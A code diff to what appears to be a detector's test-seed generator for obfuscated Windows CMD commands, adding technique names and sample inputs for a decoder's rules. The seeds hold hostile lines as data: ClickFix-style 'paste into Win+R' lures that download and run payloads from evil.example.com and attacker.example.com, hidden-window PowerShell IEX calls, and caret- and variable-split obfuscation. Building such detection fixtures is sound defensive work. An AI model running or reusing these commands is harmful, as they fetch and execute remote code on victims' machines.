@@ -22,8 +22,19 @@ const CMD_TECHNIQUE_CATALOG = Object.freeze([
   'CMD Caret Insertion (nested)',
   'CMD Variable Concatenation',
   'CMD Delayed-Expansion Indirection',
+  // "Env Var Substring" has four source sites in the decoder:
+  // inline (welded into a word), and line-level resolved / partial /
+  // structural (fired from the 3+-token resolver on a separate line).
   'CMD Env Var Substring (inline)',
+  'CMD Env Var Substring',
+  'CMD Env Var Substring (partial)',
+  'CMD Env Var Substring (structural)',
   'CMD Env Var (argv0)',
+  // "for /f" indirect execution — the CMD-specific pattern of piping
+  // dynamic output into a callable (`for /f %i in ('…') do call %i`).
+  'CMD for /f Indirect Execution',
+  'CMD for /f Indirect Execution (partial)',
+  'CMD for /f Indirect Execution (structural)',
   'CMD ClickFix Wrapper',
 ]);
 
@@ -99,7 +110,15 @@ function genVariableConcat(rng) {
 }
 
 function genDelayedExpansion() {
-  // setlocal enabledelayedexpansion + !var! indirection.
+  // setlocal enabledelayedexpansion + !var! / !%VAR%! indirection.
+  //
+  // Two distinct decoder branches fire here:
+  //   • The `!x!` form exercises the line-level variable-concatenation
+  //     resolver (emits "CMD Variable Concatenation").
+  //   • The mixed `!%VAR%!` form specifically targets the delayed-
+  //     expansion indirection regex `/(?:!%([\w^]+)%!){2,}/` in
+  //     `src/decoders/cmd-obfuscation.js` — which requires AT LEAST
+  //     TWO adjacent mixed tokens to fire.
   return [
     makeSeed(
       'setlocal enabledelayedexpansion\nset x=powershell\n!x! -Command "whoami"',
@@ -108,6 +127,22 @@ function genDelayedExpansion() {
     makeSeed(
       'setlocal enabledelayedexpansion & set cmd=calc.exe & !cmd!',
       'calc.exe',
+    ),
+    // Delayed-expansion INDIRECTION — two adjacent !%VAR%! tokens.
+    // Resolves to 'powershell' which trips SENSITIVE_CMD_KEYWORDS.
+    makeSeed(
+      'setlocal enabledelayedexpansion\n'
+      + 'set A=power\nset B=shell\n'
+      + 'cmd /c !%A%!!%B%!',
+      'powershell',
+    ),
+    // Three-way indirection — exercises the {2,} quantifier's inner
+    // iteration and the vname lookup fallthrough.
+    makeSeed(
+      'setlocal enabledelayedexpansion\n'
+      + 'set P=pow\nset Q=er\nset R=shell\n'
+      + '!%P%!!%Q%!!%R%! /c whoami',
+      'powershell',
     ),
   ];
 }
@@ -132,29 +167,69 @@ function genEnvVarSubstring() {
 }
 
 function genArgv0() {
-  // %~0 / %0 in a batch file — expands to the full invocation path. The
-  // finder surfaces it as "CMD Env Var (argv0)".
+  // CMD Env Var (argv0) — bare `%COMSPEC%` / `%SystemRoot%\System32\cmd.exe`
+  // in argv0 position. The decoder (cmd-obfuscation.js ~line 400)
+  // recognises ONLY `COMSPEC` / `SYSTEMROOT` / `WINDIR` here and
+  // additionally requires the tail to contain ` /x` or ` -x`
+  // (switch-style argument) — otherwise the bare var is interpreted
+  // as a documentation echo and suppressed.
+  //
+  // (The prior seed emitted `%~f0` / `%~nx0` — batch-script
+  // self-reference syntax — which is a different concept the finder
+  // doesn't model.)
   return [
-    makeSeed('call "%~f0" --payload', '%~f0'),
-    makeSeed('%~nx0 /k whoami', '%~nx0'),
+    makeSeed('%COMSPEC% /c whoami', 'cmd.exe'),
+    makeSeed(
+      '%SystemRoot%\\System32\\cmd.exe /c powershell -NoP -C "whoami"',
+      'cmd.exe',
+    ),
+    // After a `&` separator — argv0 regex anchors at line-start OR
+    // after `&&` / `&` / `|` / `||` / `(` / `)`.
+    makeSeed(
+      'echo starting & %COMSPEC% /c curl http://evil.example.com/x',
+      'cmd.exe',
+    ),
+    // Caret-split var name — the decoder strips carets before the
+    // COMSPEC / SYSTEMROOT match.
+    makeSeed(
+      '%Co^m^s^p^ec% /c whoami',
+      'cmd.exe',
+    ),
   ];
 }
 
 function genClickFix() {
   // ClickFix = "Run dialog" social-engineering wrapper: user is told
-  // to paste a line into Win+R. The finder looks for the explain-me
-  // phrase + a trailing powershell/cmd payload. The technique surfaces
-  // as critical — see cmd-obfuscation.js:678.
+  // to paste a line into Win+R. The finder in cmd-obfuscation.js
+  // requires ALL THREE of:
+  //   (a) a delivery vector — any sensitive CMD/PS decode candidate;
+  //   (b) a ClickFix cue phrase — Win+R / Ctrl+V / paste / captcha
+  //       / "I'm not a robot" / "click to verify" (CLICKFIX_CUES);
+  //   (c) a trailing `echo "…"` with ≥3 consecutive spaces in the
+  //       quoted body (trailingEchoRe) — the hallmark of lure-page
+  //       payloads that embed a `echo '   ✓ Verification complete'`
+  //       to hide the pasted command below the visible scroll.
+  //
+  // The previous seeds satisfied (a) + (b) but lacked (c), so the
+  // 3-of-3 gate never fired.
   return [
     makeSeed(
       '# Press Win+R then paste the following and press Enter\n'
-      + 'powershell -Command "IEX(IWR https://evil.example.com/p.ps1)"',
+      + 'powershell -NoP -Command "IEX(IWR https://evil.example.com/p.ps1)"\n'
+      + 'echo "   ✓ Verification complete"',
       'powershell',
     ),
     makeSeed(
-      'Copy this command and paste into Windows Run dialog:\n'
-      + 'cmd /c curl http://attacker.example.com/x -o %TEMP%\\x.exe && %TEMP%\\x.exe',
+      'Verify you are human: Ctrl+V the command into Windows Run dialog:\n'
+      + 'cmd /c curl http://attacker.example.com/x -o %TEMP%\\x.exe && %TEMP%\\x.exe\n'
+      + 'echo "    Please wait while we verify your browser   "',
       'curl',
+    ),
+    makeSeed(
+      'I\'m not a robot — paste below:\n'
+      + 'powershell.exe -NoP -W Hidden -C "& { IEX (IWR -UseB http://e.example/p) }"\n'
+      + 'echo "      Loading captcha …      "',
+      'powershell',
     ),
   ];
 }
